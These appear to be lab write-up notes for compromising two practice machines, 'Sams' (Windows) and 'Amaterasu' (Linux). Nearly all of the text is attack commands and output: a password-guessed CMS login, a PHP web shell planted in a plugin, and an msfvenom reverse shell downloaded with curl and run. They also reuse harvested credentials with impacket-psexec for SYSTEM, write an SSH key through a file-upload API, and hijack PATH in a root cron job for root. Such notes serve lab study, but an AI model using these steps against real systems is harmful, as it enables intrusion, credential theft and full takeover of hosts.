## Sams 
```
Scan the Port:
Discovered open port 445/tcp
Discovered open port 3306/tcp 
Discovered open port 7680/tcp 
Discovered open port 80/tcp 
Discovered open port 443/tcp 

After discovering an admin login page we can authenticate via password guessing.
After logging into the admin page we discover the software version which is vulnerable to RCE.

curl 192.168.xx.xx/testing/ --header "Host: www.sams.me"
There is no website configured at this address: http://www.sams.me    

I should set a correct host name.


ffuf  -u http://192.168.xx.xx/testing/FUZZ  -w /usr/share/dirb/wordlists/common.txt -fw 9
robots.txt              [Status: 200, Size: 12, Words: 2, Lines: 1, Duration: 444ms]
system                  [Status: 301, Size: 350, Words: 22, Lines: 10, Duration: 447ms]
web                     [Status: 301, Size: 347, Words: 22, Lines: 10, Duration: 916ms]
web.config              [Status: 200, Size: 5093, Words: 1434, Lines: 75, Duration: 1385ms]


Some directories:
(1) /testing/system
images,fonts,skins,themes,languages, js,libs
(2) /testing/web/main/
data, media, blocks,apps, thems, 
(3)/testing/install/
SCHLIX cms INSTALL

curl http://192.168.xx.xx/testing/ --header "Host: sams.pg"
Tried a long time, try hostname: sams.pg, get normal page. Add this host name to /etc/hosts

http://sams.pg/testing/admin/
Username: admin | Password: testing
Guess the password and find password is testing.

Login SCHLIX cms, delete install, find the version,search exploit:
Schlix CMS 2.2.6-6 - Remote Code Execution (Authenticated)
https://www.exploit-db.com/exploits/49838

Enter block management
Download https://github.com/calip/app_mailchimp，Modify /blocks/mailchimp/packageinfo.inc
$command = shell_exec($_POST[cmd]);
echo "<pre>$command</pre>";

zip the files again，install a package and upload the zip，enter this package ，click About，get shell.
[~/Public/pg/app_mailchimp-master]
└─$ zip -r combo_mailchimp-1_0_1.zip *

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.94 LPORT=443 -f exe -o stp.exe

Execute two steps using webshell:
cmd=curl 192.168.xx.xx/stp.exe -o stp.exe
cmd=cmd /c stp.exe


rlwrap nc -nlvp  443
listening on [any] 443 ...

C:\xampp\htdocs\testing>whoami /all
whoami /all

USER INFORMATION
----------------

User Name   SID
=========== ==============================================
sams-pc\sam S-1-5-21-2619112490-2635448554-1147358759-1002

type C:\xampp\htdocs\testing\web\main\config.inc.php
define('SCHLIX_DB_DATABASE','schlix'); /* database name */
define('SCHLIX_DB_USERNAME','schlix'); /* database username */
define('SCHLIX_DB_PASSWORD','Schlix1411'); /* database password */

type  C:\Users\sam\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cd C:\xampp\htdocs\
cd ..
ls -l
dir
cat .\properties.ini
cd .\phpMyAdmin\
ls
cat .\babel.config.json
cat .\config.inc.php
ls
cat .\config.inc.php .\config.inc.old.php
cp .\config.inc.php .\config.inc.old.php
notepad .\config.inc.old.php
cat .\config.inc.old.php

C:\xampp\phpMyAdmin>type config.inc.*
type config.inc.*

config.inc.old.php
/* Authentication type and info */
$cfg['Servers'][$i]['auth_type'] = 'config';
$cfg['Servers'][$i]['user'] = 'root';
$cfg['Servers'][$i]['password'] = 'SeriousSAM14';
$cfg['Servers'][$i]['extension'] = 'mysqli';


Got password for root, mybe it's also administrator's password

Try it and get system:

─$ impacket-psexec administrator:SeriousSAM14@192.168.94.248
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.94.248.....
[*] Found writable share ADMIN$
[*] Uploading file oRunnMsG.exe
[*] Opening SVCManager on 192.168.94.248.....
[*] Creating service hZrr on 192.168.94.248.....
[*] Starting service hZrr.....
[!] Press help for extra shell commands                                                                                                                Microsoft Windows [Version 10.0.19045.2728]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32> whoami                                         
nt authority\system
```

## Amaterasu Linux
```
Discovered open port 21/tcp
Discovered open port 33414/tcp 
Discovered open port 25022/tcp 

curl 192.168.xx.249:33414 -vv
< Server: Werkzeug/2.2.3 Python/3.9.13

 ffuf -u http://192.168.xx.249:33414/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
 help                    [Status: 200, Size: 137, Words: 19, Lines: 2, Duration: 410ms]
info                    [Status: 200, Size: 98, Words: 14, Lines: 2, Duration: 377ms]

0	"GET /info : General Info"
1	"GET /help : This listing"
2	"GET /file-list?dir=/tmp : List of the files"
3	"POST /file-upload : Upload files"

/info	
0	"Python File Server REST API v2.5"
1	"Author: Alfredo Moroder"
2	"GET /help = List of the commands"

/home/alfredo/.ssh
0	"id_rsa"
1	"id_rsa.pub"

/home/alfredo/.ssh/authorized_keys

POST /file-upload HTTP/1.1
Host: 192.168.94.249:33414
Content-Type: multipart/form-data; boundary=---------------------------160925408319873804683494608808
Content-Length: 909
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------160925408319873804683494608808
Content-Disposition: form-data; name="file"; filename="id_rsa.gif"
Content-Type: image/gif

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCx6dpZCyurT4efhVQ8AT8pXWGcRStFVI14GagW4ECbi+KXlQtQXIUtqcbW9MsZynZ30BBoo8uX5fukH3e579udsvNQHlno3x0fvf+pyQ+8dumcZpx2xU7fisjdIK1Eaw5rInrOstuqazO1dit8RyRIVt5viTXrXmbvkeVJ6+yimkH57TIGtXmRaOW2vBYkUHlkN/rFf7EJ7B7rAT7Nmyv8MeTMj83HCxGtp51dkk0Ywl8HByGaiGfil+bcKnhkWbsBqNBHjEJdzM2bkfl/a8YVsNqVpncGlgwOPEZ2JkweEYMk599L3HyB6jvrBMLlNU50aaw6QGxc9LqvTEVh9SCwM+pRfigKA+4fetEdEd7ED8453Pip6dqbf1zbMgNgMAGHp9MTPds5IxnVY0BFvk5vAtg0E6rLQUuTGADbtNNtTPjtPu2bdi65h6deNvxFqQsyWZPb9CMiDHcqN84NuOLSRhdSKWcPrpNuJPnP1TlgeDNb4r+HnbR1jq8NNQ4ssFs= kali@kali

-----------------------------160925408319873804683494608808
Content-Disposition: form-data; name="filename"

/home/alfredo/.ssh/authorized_keys
-----------------------------160925408319873804683494608808--

 ssh -i ~/.ssh/id_rsa alfredo@192.168.xx.249 -p 25022

find / -perm -u=s 2>/dev/null
/usr/bin/crontab

pspy64s
 /bin/sh /usr/local/bin/backup-flask.sh
2023/04/15 00:17:01 CMD: UID=0    PID=17038  | tar czf /tmp/flask.tar.gz app.py main.py __pycache__
2023/04/15 00:17:01 CMD: UID=0    PID=17039  | gzip
2023/04/15 00:17:51 CMD: UID=0    PID=17044  | systemd-userwork xxxxxxxxxxxxxxxx
2023/04/15 00:17:51 CMD: UID=0    PID=17043  | /usr/lib/systemd/systemd-userdbd
2023/04/15 00:17:51 CMD: UID=0    PID=17042  | /usr/lib/systemd/systemd-userdbd
2023/04/15 00:18:01 CMD: UID=0    PID=17045  | /usr/sbin/crond -n
2023/04/15 00:18:01 CMD: UID=0    PID=17046  | /bin/bash -c /usr/local/bin/backup-flask.sh
2023/04/15 00:18:01 CMD: UID=0    PID=17047  | tar czf /tmp/flask.tar.gz app.py main.py __pycache__
2023/04/15 00:18:01 CMD: UID=0    PID=17048  | /bin/sh -c gzip
2023/04/15 00:19:01 CMD: UID=0    PID=17051  | /usr/sbin/crond -n
2023/04/15 00:19:01 CMD: UID=0    PID=17052  | /bin/bash -c /usr/local/bin/backup-flask.sh
2023/04/15 00:19:01 CMD: UID=0    PID=17053  | tar czf /tmp/flask.tar.gz app.py main.py __pycache__


[alfredo@fedora ~]$ cat /usr/local/bin/backup-flask.sh
#!/bin/sh
    export PATH="/home/alfredo/restapi:$PATH"
cd /home/alfredo/restapi
tar czf /tmp/flask.tar.gz *

hijack command `tar`:
[alfredo@fedora restapi]$ cat tar
#!/bin/sh
chmod +s /bin/bash
[alfredo@fedora restapi]$ ls -al /bin/bash
-rwsr-sr-x. 1 root root 1390080 Jan 25  2021 /bin/bash
[alfredo@fedora restapi]$ /bin/bash -p
bash-5.1# id
uid=1000(alfredo) gid=1000(alfredo) euid=0(root) egid=0(root) groups=0(root),1000(alfredo)
```
